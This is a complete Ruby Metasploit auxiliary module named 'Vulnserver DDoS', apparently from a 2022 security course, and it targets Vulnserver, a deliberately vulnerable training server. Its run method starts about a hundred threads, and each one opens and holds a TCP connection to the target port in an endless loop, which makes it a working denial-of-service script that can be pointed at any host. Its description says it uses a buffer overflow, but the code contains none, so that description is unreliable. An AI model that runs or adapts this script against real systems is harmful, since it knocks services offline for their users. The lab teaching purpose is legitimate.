require 'socket'

class MetasploitModule < Msf::Auxiliary

    Rank = NormalRanking

include Msf::Exploit::Remote::Tcp

def initialize(info = {})

    super(update_info(info, #calls parent class update_info function
        'Name'           => 'Vulnserver DDoS', # Name of the target
        'Description'    => %q{
            Vulnserver is intentially written vulnerable. This expoits uses a simple buffer overflow.
        },
        'Author'         => [ 'fxw', 'GenCyber-UML-2022'], # Author name
        'License'        => MSF_LICENSE,
        'References'     =>	# References for the vulnerability or exploit
        [
            [ 'URL', 'https://github.com/xinwenfu/Malware-Analysis/edit/main/MetasploitNewModule' ]
        ],
        'Privileged'     => false,
        'DefaultOptions' =>
        { 
            'RPORT' => 9999
        },
        'Platform'       => 'Win',	# Supporting what platforms are supported, e.g., win, linux, osx, unix, bsd.
        'DisclosureDate' => 'Mar. 30, 2022'))	# When the vulnerability was disclosed in public
        register_options(
        [
            OptInt.new('ThreadNum', [ true, 'A hex or decimal', 102]) # Sets the number of threads to use
        ])
    end

    def startExploit # Connect to the server
        print_status("Connecting to target with IP #{datastore['RHOST']} and Port #{datastore['RPORT']}")

        s = TCPSocket.new datastore['RHOST'], datastore['RPORT'] # Connect to the server
        #connect #connect to target using values stored in datastore

        while(1)
            s.gets # Read the response from the server
        end
    end

    def run	# Actual exploit, since this is a Auxiliary, it is a run function, type run to execute
        for x in 1..datastore['ThreadNum'] do
                Thread.new{startExploit()} # Run startExploit for each thread

                print_status("Running exploit on thread #{x}")
            end

        print_status("Finished sending messages")

    end
end